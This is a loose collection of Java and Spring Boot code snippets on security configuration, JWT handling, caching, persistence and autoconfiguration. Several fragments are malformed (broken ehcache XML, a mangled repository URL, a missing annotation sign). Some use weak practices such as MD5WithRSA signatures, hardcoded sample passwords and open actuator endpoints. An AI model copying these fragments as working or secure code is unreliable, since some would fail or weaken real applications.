        MongoDatabase database = mongoClient.getDatabase("my-database");
        MongoCollection<Document> collection = database.getCollection("test-collection");

        //query collection
        //finding all
        FindIterable<Document> documents = collection.find();
        for (Document document : documents) {
            System.out.println(document.toString());
        }
    }
}
--------------------------------------------------------------------------------------------------------
let d: Date = new Date();
let y: number = d.getFullYear();
console.log(y);
--------------------------------------------------------------------------------------------------------
   @PostConstruct
    public void init() {
       requestMappingHandlerAdapter.setIgnoreDefaultModelOnRedirect(true);
    }
--------------------------------------------------------------------------------------------------------
    // 2G network types
    public static final String GSM = "gsm";
    public static final String GPRS = "gprs";
    public static final String EDGE = "edge";
    // 3G network types
    public static final String CDMA = "cdma";
    public static final String UMTS = "umts";
    public static final String HSPA = "hspa";
    public static final String HSUPA = "hsupa";
    public static final String HSDPA = "hsdpa";
    public static final String ONEXRTT = "1xrtt";
    public static final String EHRPD = "ehrpd";
    // 4G network types
    public static final String LTE = "lte";
    public static final String UMB = "umb";
    public static final String HSPA_PLUS = "hspa+";
--------------------------------------------------------------------------------------------------------
security.oauth2.resource.jwk.keySetUri=https://blog-samples.auth0.com/.well-known/jwks.json
security.oauth2.resource.id=https://ads-api

import org.springframework.beans.factory.annotation.Value;
import org.springframework.context.annotation.Configuration;
import org.springframework.security.config.annotation.web.builders.HttpSecurity;
import org.springframework.security.oauth2.config.annotation.web.configuration.EnableResourceServer;
import org.springframework.security.oauth2.config.annotation.web.configuration.ResourceServerConfigurerAdapter;
import org.springframework.security.oauth2.config.annotation.web.configurers.ResourceServerSecurityConfigurer;

@Configuration
@EnableResourceServer
public class SecurityConfig extends ResourceServerConfigurerAdapter {
    @Value("${security.oauth2.resource.id}")
    private String resourceId;

    @Override
    public void configure(HttpSecurity http) throws Exception {
        http.authorizeRequests()
                .mvcMatchers("/ads/**").authenticated();
    }

    @Override
    public void configure(ResourceServerSecurityConfigurer resources) {
        resources.resourceId(resourceId);
    }
}
--------------------------------------------------------------------------------------------------------
import com.auth0.spring.security.api.JwtWebSecurityConfigurer;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.context.annotation.Configuration;
import org.springframework.http.HttpMethod;
import org.springframework.security.config.annotation.web.builders.HttpSecurity;
import org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;
import org.springframework.security.config.annotation.web.configuration.WebSecurityConfigurerAdapter;

@Configuration
@EnableWebSecurity
public class SecurityConfig extends WebSecurityConfigurerAdapter {

    @Value(value = "${auth0.apiAudience}")
    private String apiAudience;
    @Value(value = "${auth0.issuer}")
    private String issuer;

    @Override
    protected void configure(HttpSecurity http) throws Exception {
        http.cors();
        JwtWebSecurityConfigurer
                .forRS256(apiAudience, issuer)
                .configure(http)
                .authorizeRequests()
                .antMatchers(HttpMethod.GET, "/").permitAll()
                .antMatchers(HttpMethod.GET, "/secured").authenticated();
    }
}
--------------------------------------------------------------------------------------------------------
@EnableWebMvc
@Configuration
@ComponentScan({ "com.baeldung.web" })
public class WebConfig implements WebMvcConfigurer {
 
    @Override
    public void configureMessageConverters(
      List<HttpMessageConverter<?>> converters) {
     
        messageConverters.add(createXmlHttpMessageConverter());
        messageConverters.add(new MappingJackson2HttpMessageConverter());
    }
    private HttpMessageConverter<Object> createXmlHttpMessageConverter() {
        MarshallingHttpMessageConverter xmlConverter = 
          new MarshallingHttpMessageConverter();
 
        XStreamMarshaller xstreamMarshaller = new XStreamMarshaller();
        xmlConverter.setMarshaller(xstreamMarshaller);
        xmlConverter.setUnmarshaller(xstreamMarshaller);
 
        return xmlConverter;
    }
}
--------------------------------------------------------------------------------------------------------
     * <p>
     *     getting a list of customers whose status is isActive
     * </p>
     * @return  list of customer instances as {@link List<Customer>}
     */
    @Override
    public List<Customer> getActiveCustomers() {
        Session session = null;
        List<Customer> customerList = null;
        try{
            session = sessionFactory.openSession();
            Criteria criteria = session.createCriteria(Customer.class).add(Restrictions.eq("isActive",true));
            customerList = (List<Customer>) criteria.list();
            System.out.println(" size ["+customerList.size()+"]");
        }
        finally {
            if(session!=null){
                session.close();
            }
        }
        return customerList;
    }
--------------------------------------------------------------------------------------------------------
    @Async
    public Future<String> execute()
    {

        LOGGER.info("AsyncWorkerFuture: current thread [" + Thread.currentThread().getName() + "]");
        try {
            Thread.sleep(10000);
            LOGGER.info("AsyncWorkerFuture returns after sleep");
        } catch (InterruptedException ex) {
            LOGGER.info(" sleeping thread interrupted ");
        }

        return new AsyncResult<String>(Long.toString(System.currentTimeMillis()));
    }
--------------------------------------------------------------------------------------------------------
server.port  = 9091

security.oauth2.client.client-id=client
security.oauth2.client.client-secret=password

security.oauth2.resource.token-info-uri=http://localhost:9090/oauth/check_token
--------------------------------------------------------------------------------------------------------
    @Bean(name = "authenticationManager")
    @Override
    public AuthenticationManager authenticationManagerBean() throws Exception {
        return super.authenticationManagerBean();
    }
--------------------------------------------------------------------------------------------------------
    @ApiOperation(value = "creating new user")
    @PostMapping("/users")
    public AddUserResponse createUser(@Valid @RequestBody AddUserRequest addUserRequest, BindingResult bindingResult) throws PersistentException {
        if (bindingResult.hasErrors()) {
            throw new PersistentException(bindingResult.getAllErrors().get(0).getDefaultMessage());
        }
        return userService.create(addUserRequest);
    }
--------------------------------------------------------------------------------------------------------
    @Override
    public void configure(WebSecurity web) throws Exception {
        web.ignoring().antMatchers("/v2/api-docs",
                        "/configuration/ui",
                        "/swagger-resources",
                        "/configuration/security",
                        "/swagger-ui.html",
                        "/webjars/**");
    }
--------------------------------------------------------------------------------------------------------
import org.slf4j.MDC;
import org.springframework.stereotype.Component;

import javax.servlet.*;
import java.io.IOException;

@Component
public class MdcLogEnhancerFilter implements Filter {

    @Override
    public void destroy() {

    }

    @Override
    public void init(FilterConfig filterConfig) throws ServletException {

    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException
    {
        MDC.put("userId", "www.SpringBootDev.com");
        filterChain.doFilter(servletRequest, servletResponse);
    }
}
--------------------------------------------------------------------------------------------------------

@Entity
@Table(name = "student_courses")
@IdClass(StudentCourseId.class)
public class StudentCourseEnrollment implements Serializable
{
    @Id
    @ManyToOne
    @JoinColumn(name = "course_id", referencedColumnName = "id")
    private Course course;

    @Id
    @ManyToOne
    @JoinColumn(name = "student_id", referencedColumnName = "id")
    private Student student;

    @JoinColumn(name = "from_date")
    private String fromDate;

    @JoinColumn(name = "to_date")
    private String toDate;

    public Course getCourse() {
        return course;
    }
--------------------------------------------------------------------------------------------------------
@Configuration
public class WebConfig extends WebMvcConfigurationSupport {

  @Bean
  public RequestMappingHandlerAdapter requestMappingHandlerAdapter() {
    RequestMappingHandlerAdapter handlerAdapter = super.requestMappingHandlerAdapter();
    handlerAdapter.getMessageConverters().add(0, getProtobufJsonMessageConverter());
    return handlerAdapter;
  }
--------------------------------------------------------------------------------------------------------
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.data.jpa.repository.config.EnableJpaRepositories;
import org.springframework.jdbc.datasource.embedded.EmbeddedDatabaseBuilder;
import org.springframework.jdbc.datasource.embedded.EmbeddedDatabaseType;
import org.springframework.orm.jpa.JpaTransactionManager;
import org.springframework.orm.jpa.LocalContainerEntityManagerFactoryBean;
import org.springframework.orm.jpa.vendor.Database;
import org.springframework.orm.jpa.vendor.HibernateJpaVendorAdapter;
import org.springframework.transaction.PlatformTransactionManager;
import org.springframework.transaction.annotation.EnableTransactionManagement;

import javax.sql.DataSource;

@Configuration
@EnableJpaRepositories
@EnableTransactionManagement
public class AppConfiguration {

    @Bean
    public DataSource dataSource() {
        EmbeddedDatabaseBuilder builder = new EmbeddedDatabaseBuilder();
        return builder.setType(EmbeddedDatabaseType.HSQL).build();
    }

    @Bean
    public LocalContainerEntityManagerFactoryBean entityManagerFactory() {
        HibernateJpaVendorAdapter vendorAdapter = new HibernateJpaVendorAdapter();
        vendorAdapter.setDatabase(Database.HSQL);
        vendorAdapter.setGenerateDdl(true);

        LocalContainerEntityManagerFactoryBean factory = new LocalContainerEntityManagerFactoryBean();
        factory.setJpaVendorAdapter(vendorAdapter);
        factory.setPackagesToScan(getClass().getPackage().getName());
        factory.setDataSource(dataSource());

        return factory;
    }

    @Bean
    public PlatformTransactionManager transactionManager() {
        return new JpaTransactionManager();
    }
}
--------------------------------------------------------------------------------------------------------
import com.chathuranga.rest.jwt.auth.SecretKeyProvider;
import io.jsonwebtoken.Claims;
import io.jsonwebtoken.Jws;
import io.jsonwebtoken.Jwts;
import io.jsonwebtoken.SignatureAlgorithm;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Component;
 
import java.io.IOException;
import java.net.URISyntaxException;
import java.time.LocalDateTime;
import java.util.Date;
 
import static java.time.ZoneOffset.UTC;
 
@Component
public class JwtService {
 
    private static final String ISSUER = "com.chathuranga.examples";
 
    @Autowired
    private SecretKeyProvider secretKeyProvider;
 
    public String generateToken(String username) throws IOException, URISyntaxException {
        byte[] secretKey = secretKeyProvider.getKey();
        Date expiration = Date.from(LocalDateTime.now(UTC).plusHours(2).toInstant(UTC));
        return Jwts.builder()
                .setSubject(username)
                .setExpiration(expiration)
                .setIssuer(ISSUER)
                .signWith(SignatureAlgorithm.HS512, secretKey)
                .compact();
    }
 
    public String verifyToken(String token) throws IOException, URISyntaxException {
        byte[] secretKey = secretKeyProvider.getKey();
        Jws<Claims> claims = Jwts.parser().setSigningKey(secretKey).parseClaimsJws(token);
        //returning authenticated/verified username
        return claims.getBody().getSubject();
    }
}
--------------------------------------------------------------------------------------------------------
import com.chathuranga.rest.jwt.auth.SecretKeyProvider;
import io.jsonwebtoken.Claims;
import io.jsonwebtoken.Jws;
import io.jsonwebtoken.Jwts;
import io.jsonwebtoken.SignatureAlgorithm;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Component;
 
import java.io.IOException;
import java.net.URISyntaxException;
import java.time.LocalDateTime;
import java.util.Date;
 
import static java.time.ZoneOffset.UTC;
 
@Component
public class JwtService {
 
    private static final String ISSUER = "com.chathuranga.examples";
 
    @Autowired
    private SecretKeyProvider secretKeyProvider;
 
    public String generateToken(String username) throws IOException, URISyntaxException {
        byte[] secretKey = secretKeyProvider.getKey();
        Date expiration = Date.from(LocalDateTime.now(UTC).plusHours(2).toInstant(UTC));
        return Jwts.builder()
                .setSubject(username)
                .setExpiration(expiration)
                .setIssuer(ISSUER)
                .signWith(SignatureAlgorithm.HS512, secretKey)
                .compact();
    }
 
    public String verifyToken(String token) throws IOException, URISyntaxException {
        byte[] secretKey = secretKeyProvider.getKey();
        Jws<Claims> claims = Jwts.parser().setSigningKey(secretKey).parseClaimsJws(token);
        //returning authenticated/verified username
        return claims.getBody().getSubject();
    }
}
--------------------------------------------------------------------------------------------------------
<plugin>
    <groupId>org.apache.maven.plugins</groupId>
    <artifactId>maven-compiler-plugin</artifactId>
    <version>3.7.0</version>
    <configuration>
        <compilerArgs>
            <arg>-Xlint:-path</arg>
        </compilerArgs>
    </configuration>
</plugin>
--------------------------------------------------------------------------------------------------------
mvn  clean install tomcat7:run-war
--------------------------------------------------------------------------------------------------------
@Controller
@RequestMapping("/customers")
public class CustomerController {
    @Autowired
    private CustomerDataService customerDataService;

    @RequestMapping(method = RequestMethod.GET)
    private String handleRequest (Model model) {
        model.addAttribute("customerList", customerDataService.getAllUsers());
        return "customers";
    }
}
--------------------------------------------------------------------------------------------------------
ConditionalOnProperty(
  name = "usemysql", 
  havingValue = "local")
@ConditionalOnMissingBean
public DataSource dataSource() {
    DriverManagerDataSource dataSource = new DriverManagerDataSource();
  
    dataSource.setDriverClassName("com.mysql.cj.jdbc.Driver");
    dataSource.setUrl("jdbc:mysql://localhost:3306/myDb?createDatabaseIfNotExist=true");
    dataSource.setUsername("mysqluser");
    dataSource.setPassword("mysqlpass");
 
    return dataSource;
}


@Bean(name = "dataSource")
@ConditionalOnProperty(
  name = "usemysql", 
  havingValue = "custom")
@ConditionalOnMissingBean
public DataSource dataSource2() {
    DriverManagerDataSource dataSource = new DriverManagerDataSource();
         
    dataSource.setDriverClassName("com.mysql.cj.jdbc.Driver");
    dataSource.setUrl(env.getProperty("mysql.url"));
    dataSource.setUsername(env.getProperty("mysql.user") != null
      ? env.getProperty("mysql.user") : "");
    dataSource.setPassword(env.getProperty("mysql.pass") != null
      ? env.getProperty("mysql.pass") : "");
         
    return dataSource;
}
@ConditionalOnResource(
  resources = "classpath:mysql.properties")
@Conditional(HibernateCondition.class)
Properties additionalProperties() {
    Properties hibernateProperties = new Properties();
 
    hibernateProperties.setProperty("hibernate.hbm2ddl.auto", 
      env.getProperty("mysql-hibernate.hbm2ddl.auto"));
    hibernateProperties.setProperty("hibernate.dialect", 
      env.getProperty("mysql-hibernate.dialect"));
    hibernateProperties.setProperty("hibernate.show_sql", 
      env.getProperty("mysql-hibernate.show_sql") != null
      ? env.getProperty("mysql-hibernate.show_sql") : "false");
    return hibernateProperties;
}

static class HibernateCondition extends SpringBootCondition {
 
    private static String[] CLASS_NAMES
      = { "org.hibernate.ejb.HibernateEntityManager", 
          "org.hibernate.jpa.HibernateEntityManager" };
 
    @Override
    public ConditionOutcome getMatchOutcome(ConditionContext context, 
      AnnotatedTypeMetadata metadata) {
  
        ConditionMessage.Builder message
          = ConditionMessage.forCondition("Hibernate");
        return Arrays.stream(CLASS_NAMES)
          .filter(className -> ClassUtils.isPresent(className, context.getClassLoader()))
          .map(className -> ConditionOutcome
            .match(message.found("class")
            .items(Style.NORMAL, className)))
          .findAny()
          .orElseGet(() -> ConditionOutcome
            .noMatch(message.didNotFind("class", "classes")
            .items(Style.NORMAL, Arrays.asList(CLASS_NAMES))));
    }
}

@RunWith(SpringJUnit4ClassRunner.class)
@SpringBootTest(
  classes = AutoconfigurationApplication.class)
@EnableJpaRepositories(
  basePackages = { "com.baeldung.autoconfiguration.example" })
public class AutoconfigurationTest {
 
    @Autowired
    private MyUserRepository userRepository;
 
    @Test
    public void whenSaveUser_thenOk() {
        MyUser user = new MyUser("user@email.com");
        userRepository.save(user);
    }
}

@Configuration
@EnableAutoConfiguration(
  exclude={MySQLAutoconfiguration.class})
public class AutoconfigurationApplication {
    //...
}

org.springframework.boot.autoconfigure.EnableAutoConfiguration=com.baeldung.autoconfiguration.MySQLAutoconfiguration
--------------------------------------------------------------------------------------------------------
MessageSourceAutoConfiguration 
--------------------------------------------------------------------------------------------------------
spring init -d=web,actuator -n=actuator-demo actuator-demo
--------------------------------------------------------------------------------------------------------
# INFO ENDPOINT CONFIGURATION
info.app.name=@project.name@
info.app.description=@project.description@
info.app.version=@project.version@
info.app.encoding=@project.build.sourceEncoding@
info.app.java.version=@java.version@
--------------------------------------------------------------------------------------------------------
import org.springframework.boot.actuate.autoconfigure.security.servlet.EndpointRequest;
import org.springframework.boot.actuate.context.ShutdownEndpoint;
import org.springframework.boot.autoconfigure.security.servlet.PathRequest;
import org.springframework.context.annotation.Configuration;
import org.springframework.security.config.annotation.web.builders.HttpSecurity;
import org.springframework.security.config.annotation.web.configuration.WebSecurityConfigurerAdapter;

@Configuration
public class ActuatorSecurityConfig extends WebSecurityConfigurerAdapter {

    /*
        This spring security configuration does the following

        1. Restrict access to the Shutdown endpoint to the ACTUATOR_ADMIN role.
        2. Allow access to all other actuator endpoints.
        3. Allow access to static resources.
        4. Allow access to the home page (/).
        5. All other requests need to be authenticated.
        5. Enable http basic authentication to make the configuration complete.
           You are free to use any other form of authentication.
     */

    @Override
    protected void configure(HttpSecurity http) throws Exception {
        http
                .authorizeRequests()
                    .requestMatchers(EndpointRequest.to(ShutdownEndpoint.class))
                        .hasRole("ACTUATOR_ADMIN")
                    .requestMatchers(EndpointRequest.toAnyEndpoint())
                        .permitAll()
                    .requestMatchers(PathRequest.toStaticResources().atCommonLocations())
                        .permitAll()
                    .antMatchers("/")
                        .permitAll()
                    .antMatchers("/**")
                        .authenticated()
                .and()
                .httpBasic();
    }
}
--------------------------------------------------------------------------------------------------------
Type listType = new TypeToken<List<String>>() {}.getType();
List<String> characters = modelMapper.map(numbers, listType);
--------------------------------------------------------------------------------------------------------
To run the utility, go to the directory where the Lucene library files are located and run the following command: 
java -ea:org.apache.lucene... org.apache.lucene.index.CheckIndex INDEX_PATH -fix
--------------------------------------------------------------------------------------------------------
    BigInteger modulus = new BigInteger(Base64.getDecoder().decode(publicKeyString));
    BigInteger exponent = new BigInteger(Base64.getDecoder().decode("AQAB"));

    RSAPublicKeySpec keySpec = new RSAPublicKeySpec(modulus, exponent);
    KeyFactory keyFactory = KeyFactory.getInstance("RSA");
    PublicKey pubKey = keyFactory.generatePublic(keySpec);

    byte[] sigToVerify = Base64.getDecoder().decode(signatureString);
    Signature sig = Signature.getInstance("MD5WithRSA");
    sig.initVerify(pubKey);
    boolean verifies = sig.verify(sigToVerify);
--------------------------------------------------------------------------------------------------------
eyJhbGciOiJodHRwOi8vd3d3LnczLm9yZy8yMDAxLzA0L3htbGRzaWctbW9yZSNyc2Etc2hhMjU2IiwidHlwIjoiSldUIn0.eyJqdGkiOiI4ZjZmNWZkOC00NzhmLTQ0Y2MtYTZmZS0zMzQzNmM2ZTBkZWMiLCJ1c2VyaWQiOiI1N2Q0ZTFkOC00NWQ4LTQ2NjItNTIzYi0wOGQ3MjYxNmU4MmQiLCJvd25lcmlkIjoiODc2ZWFmNDQtNzUyMy00YjEzLThhMmEtNzBlYWVkNDU4OTAyIiwiZXhwIjoxNTY2NDY0ODEzLCJpc3MiOiJSZWdpc3RyeSIsImF1ZCI6IlJlZ2lzdHJ5In0.p4gbYXYBRuTPMNS81UrPvx06BFh8d3p_oRI0KVVRtCUiaUd6sAkWequyVJZEdmiYGvcqb6OHj1BAiXnAR1Cibg6FlKeVS31SyJqHkZWlaDDR1LDmu4SJPZ8cixYeAWBMXE_10EbjLxFY3nBOEg1vtUM3WNTws2pfoAFA8oqb9uqjeI_33_9fW206hLngb98ICr8WWJFcfRTsAHc0pc-XRQCkZH8LKpL-QpT6HqPxzP_sStxPHvhYZRcHFXxVwrcAEOtthfgFReAx0XwVEJXYsiRrTKApLyYvVIL7GvbJ6dyinWOKNCU861bsdsGiQmK7-HdQwAya4nUl_IEGQlnYzw
--------------------------------------------------------------------------------------------------------
@SpringBootApplication 
@EnableOAuth2Client
@EnableAuthorizationServer
@Order(SecurityProperties.ACCESS_OVERRIDE_ORDER)
public class MsAuthorizationGmailApplication extends WebSecurityConfigurerAdapter {

    @Autowired
    OAuth2ClientContext oauth2ClientContext;

    @Override
    protected void configure(HttpSecurity http) throws Exception {
        http.antMatcher("/**").authorizeRequests().antMatchers("/", "/login**", "/webjars/**").permitAll().anyRequest()
            .authenticated().and().exceptionHandling()
            .authenticationEntryPoint(new LoginUrlAuthenticationEntryPoint("/login/gmail")).and().logout()
            .logoutSuccessUrl("/").permitAll().and().csrf()
            .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse()).and()
            .addFilterBefore(ssoFilter(), BasicAuthenticationFilter.class);
    }

    @Bean
    @ConfigurationProperties("gmail")
    public ClientResources gmail() {
        return new ClientResources();
    }

    private Filter ssoFilter() {
        CompositeFilter filter = new CompositeFilter();
        List<Filter> filters = new ArrayList<>();
        filters.add(ssoFilter(gmail(), "/login/gmail"));
        filter.setFilters(filters);
        return filter;
    }

    private Filter ssoFilter(ClientResources client, String path) {
        OAuth2ClientAuthenticationProcessingFilter filter = new     OAuth2ClientAuthenticationProcessingFilter(
            path);
        OAuth2RestTemplate template = new OAuth2RestTemplate(client.getClient(), oauth2ClientContext);
        filter.setRestTemplate(template);
        filter.setTokenServices(JwtConfig.tokenServices());
        return filter;
    }

    public static void main(String[] args) {
        SpringApplication.run(MsAuthorizationGmailApplication.class, args);
    }

}
--------------------------------------------------------------------------------------------------------
import org.hibernate.search.jpa.FullTextEntityManager;
import org.hibernate.search.jpa.Search;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.context.annotation.DependsOn;
import org.springframework.context.annotation.Description;

import javax.persistence.EntityManagerFactory;

@Configuration
@Description("Paragon MicroServices Distributor index search configuration")
public class IndexSearchConfiguration {

    @Bean
    @DependsOn({"entityManagerFactory"})
    public LuceneIndexServiceBean luceneIndexServiceBean(final EntityManagerFactory entityManagerFactory) {
        final LuceneIndexServiceBean luceneIndexServiceBean = new LuceneIndexServiceBean(entityManagerFactory);
        luceneIndexServiceBean.triggerIndexing();
        return luceneIndexServiceBean;
    }

    public static class LuceneIndexServiceBean {
        private FullTextEntityManager fullTextEntityManager;

        public LuceneIndexServiceBean(final EntityManagerFactory entityManagerFactory) {
            this.fullTextEntityManager = Search.getFullTextEntityManager(entityManagerFactory.createEntityManager());
        }

        public void triggerIndexing() {
            try {
                this.fullTextEntityManager.createIndexer().startAndWait();
            } catch (Exception e) {
            }
        }
    }
}
--------------------------------------------------------------------------------------------------------
public class TypeUtils {
  public static <T> TypeToken<List<T>> listType() {
    return new TypeToken<List<T>>() {};
  }
  
  public abstract class TypeHandler<T> {
    final TypeToken<T> type = new TypeToken<T>(getClass()) {};
  }
}

TypeToken<List<String>> stringListType = Util.<String>listType();

Authorization

Bearer 
--------------------------------------------------------------------------------------------------------
@Bean
public SecurityWebFilterChain securityWebFilterChain(
  ServerHttpSecurity http) {
    return http.authorizeExchange()
      .pathMatchers("/actuator/**").permitAll()
      .anyExchange().authenticated()
      .and().build();
}
--------------------------------------------------------------------------------------------------------
@RestController
public class Internationalization {

    @Autowired
    @Qualifier("messageResourceSB")
    MessageSource messageSource;

    @GetMapping(path = "/sayHelloIntern")
    public String sayHello(@RequestHeader(name="Accept-Language",required = false) Locale locale) {
        return messageSource.getMessage("message.greeting", null, locale);
    }
}
--------------------------------------------------------------------------------------------------------

@ConditionalOnBean(value=MyBean.class, name="NameOfMyBean")
@Controller
public class MyController{

  ...
}

--------------------------------------------------------------------------------------------------------
@RunWith(SpringRunner.class)
@SpringBootTest(classes = Application.class, webEnvironment = WebEnvironment.DEFINED_PORT)
@TestPropertySource(properties = 
 "spring.autoconfigure.exclude=org.springframework.boot.autoconfigure.security.servlet.SecurityAutoConfiguration")
public class ExcludeAutoConfigIntegrationTest {
    // ...
}


@RunWith(SpringRunner.class)
@SpringBootTest(classes = Application.class, webEnvironment = WebEnvironment.DEFINED_PORT)
@ActiveProfiles("test")
public class ExcludeAutoConfigIntegrationTest {
    // ...
}
spring.autoconfigure.exclude=org.springframework.boot.autoconfigure.security.servlet.SecurityAutoConfiguration


@RunWith(SpringRunner.class)
@SpringBootTest(classes = Application.class, webEnvironment = WebEnvironment.DEFINED_PORT)
@EnableAutoConfiguration(exclude=SecurityAutoConfiguration.class)
public class ExcludeAutoConfigIntegrationTest {
 
    @Test
    public void givenSecurityConfigExcluded_whenAccessHome_thenNoAuthenticationRequired() {
        int statusCode = RestAssured.get("http://localhost:8080/").statusCode();
         
        assertEquals(HttpStatus.OK.value(), statusCode);
    }
}


@SpringBootApplication(exclude=SecurityAutoConfiguration.class)
public class TestApplication {
 
    public static void main(String[] args) {
        SpringApplication.run(TestApplication.class, args);
    }
}

@RunWith(SpringRunner.class)
@SpringBootTest(classes = TestApplication.class, webEnvironment = WebEnvironment.DEFINED_PORT)
public class ExcludeAutoConfigIntegrationTest {
    // ...
}

---
spring:
  profiles: test
  autoconfigure.exclude: org.springframework.boot.autoconfigure.session.SessionAutoConfiguration
--------------------------------------------------------------------------------------------------------
https://howtodoinjava.com/hibernate/hibernate-ehcache-configuration-tutorial/
https://www.ehcache.org/documentation/2.8/integrations/hibernate.html
https://vladmihalcea.com/how-does-hibernate-collection-cache-work/
https://planet.jboss.org/post/collection_caching_in_the_hibernate_second_level_cache

         /**
* Returns the advanced search facilities that should appear for this country.
* @hibernate.set cascade="all" inverse="true"
* @hibernate.collection-key column="COUNTRY_ID"
* @hibernate.collection-one-to-many class="com.wotif.jaguar.domain.AdvancedSearchFacility"
* @hibernate.cache usage="read-write"
*/
public Set getAdvancedSearchFacilities() {
return advancedSearchFacilities;
"/>


             <?xml version="1.0" encoding="UTF-8"?>
<ehcache>
 <cache name="com.somecompany.someproject.domain.Country"
	maxEntriesLocalHeap="50"
	eternal="false"
	timeToLiveSeconds="600"
    <persistence strategy="localTempSwap"/>
/>
 <cache
name="com.somecompany.someproject.domain.Country.advancedSearchFacilities"
	maxEntriesLocalHeap="450"
	eternal="false"
	timeToLiveSeconds="600"
    <persistence strategy="localTempSwap"/>
/>
</ehcache>
--------------------------------------------------------------------------------------------------------
URI uri = UriComponentsBuilder
        .fromUriString("https://example.com/hotels/{hotel}")
        .queryParam("q", "{q}")
        .encode()
        .buildAndExpand("Westin", "123")
        .toUri();
--------------------------------------------------------------------------------------------------------
@GetMapping("/download")
public StreamingResponseBody handle() {
    return new StreamingResponseBody() {
        @Override
        public void writeTo(OutputStream outputStream) throws IOException {
            // write...
        }
    };
}
--------------------------------------------------------------------------------------------------------
// Target all Controllers annotated with @RestController
@ControllerAdvice(annotations = RestController.class)
public class ExampleAdvice1 {}

// Target all Controllers within specific packages
@ControllerAdvice("org.example.controllers")
public class ExampleAdvice2 {}

// Target all Controllers assignable to specific classes
@ControllerAdvice(assignableTypes = {ControllerInterface.class, AbstractController.class})
public class ExampleAdvice3 {}
--------------------------------------------------------------------------------------------------------
@RestController
public class ErrorController {

    @RequestMapping(path = "/error")
    public Map<String, Object> handle(HttpServletRequest request) {
        Map<String, Object> map = new HashMap<String, Object>();
        map.put("status", request.getAttribute("javax.servlet.error.status_code"));
        map.put("reason", request.getAttribute("javax.servlet.error.message"));
        return map;
    }
}
--------------------------------------------------------------------------------------------------------
  <repositories>
        <repository>
            <id>Nexus</id>
            <name>Maven Central</name>
            <url>HTTPS: https://repo1.maven.org/maven2</url>
        </repository>
        <repository>
            <id>egit</id>
            <name>Eclipse egit</name>
            <url>https://repo.eclipse.org/content/repositories/egit-releases/</url>
        </repository>
    </repositories>
--------------------------------------------------------------------------------------------------------
spring:
  autoconfigure:
    exclude:
      - org.springframework.boot.autoconfigure.web.servlet.WebMvcAutoConfiguration
--------------------------------------------------------------------------------------------------------
@SpringBootTest(webEnvironment = SpringBootTest.WebEnvironment.RANDOM_PORT, properties="spring.autoconfigure.exclude=org.springframework.boot.autoconfigure.mongo.embedded.EmbeddedMongoAutoConfiguration")
--------------------------------------------------------------------------------------------------------
@Configuration
@EnableCaching
@EnableScheduling
public class CachingConfig {
    public static final String GAMES = "GAMES";
    @Bean
    public CacheManager cacheManager() {
        ConcurrentMapCacheManager cacheManager = new ConcurrentMapCacheManager(GAMES);

        return cacheManager;
    }

@CacheEvict(allEntries = true, value = {GAMES})
@Scheduled(fixedDelay = 10 * 60 * 1000 ,  initialDelay = 500)
public void reportCacheEvict() {
    System.out.println("Flush Cache " + dateFormat.format(new Date()));
}

@Configuration
@EnableCaching
public class CacheConfig {

   public final static String CACHE_ONE = "cacheOne";
   public final static String CACHE_TWO = "cacheTwo";

   @Bean
   public Cache cacheOne() {
      return new GuavaCache(CACHE_ONE, CacheBuilder.newBuilder()
            .expireAfterWrite(60, TimeUnit.MINUTES)
            .build());
   }

   @Bean
   public Cache cacheTwo() {
      return new GuavaCache(CACHE_TWO, CacheBuilder.newBuilder()
            .expireAfterWrite(60, TimeUnit.SECONDS)
            .build());
   }
}
@Service
public class CachedService extends WebServiceGatewaySupport implements CachedService {

    @Inject
    private RestTemplate restTemplate;


    @Cacheable(CacheConfig.CACHE_ONE)
    public String getCached() {

        HttpHeaders headers = new HttpHeaders();
        headers.setContentType(MediaType.APPLICATION_JSON);

        HttpEntity<String> reqEntity = new HttpEntity<>("url", headers);

        ResponseEntity<String> response;

        String url = "url";
        response = restTemplate.exchange(
                url,
                HttpMethod.GET, reqEntity, String.class);

        return response.getBody();
    }
}

@EnableCaching
@Configuration
public class CacheConfiguration implements CachingConfigurer {

    @Override
    public CacheManager cacheManager() {
        ConcurrentMapCacheManager cacheManager = new ConcurrentMapCacheManager() {

            @Override
            protected Cache createConcurrentMapCache(final String name) {
                return new ConcurrentMapCache(name,
                    CacheBuilder.newBuilder().expireAfterWrite(30, TimeUnit.MINUTES).maximumSize(100).build().asMap(), false);
            }
        };

        return cacheManager;
    }

    @Override
    public KeyGenerator keyGenerator() {
        return new DefaultKeyGenerator();
    }

}
--------------------------------------------------------------------------------------------------------
public static <T> Optional<T> last(Stream<? extends T> stream) {
    Objects.requireNonNull(stream, "stream");

    Spliterator<? extends T> spliterator = stream.spliterator();
    Spliterator<? extends T> lastSpliterator = spliterator;

    // Note that this method does not work very well with:
    // unsized parallel streams when used with skip methods.
    // on that cases it will answer Optional.empty.

    // Find the last spliterator with estimate size
    // Meaningfull only on unsized parallel streams
    if(spliterator.estimateSize() == Long.MAX_VALUE) {
        for (Spliterator<? extends T> prev = spliterator.trySplit(); prev != null; prev = spliterator.trySplit()) {
            lastSpliterator = prev;
        }
    }

    // Find the last spliterator on sized streams
    // Meaningfull only on parallel streams (note that unsized was transformed in sized)
    for (Spliterator<? extends T> prev = lastSpliterator.trySplit(); prev != null; prev = lastSpliterator.trySplit()) {
        if (lastSpliterator.estimateSize() == 0) {
            lastSpliterator = prev;
            break;
        }
    }

    // Find the last element of the last spliterator
    // Parallel streams only performs operation on one element
    AtomicReference<T> last = new AtomicReference<>();
    lastSpliterator.forEachRemaining(last::set);

    return Optional.ofNullable(last.get());
}
Unit testing using junit 5:

@Test
@DisplayName("last sequential sized")
void last_sequential_sized() throws Exception {
    long expected = 10_000_000L;
    AtomicLong count = new AtomicLong();
    Stream<Long> stream = LongStream.rangeClosed(1, expected).boxed();
    stream = stream.skip(50_000).peek(num -> count.getAndIncrement());

    assertThat(Streams.last(stream)).hasValue(expected);
    assertThat(count).hasValue(9_950_000L);
}

@Test
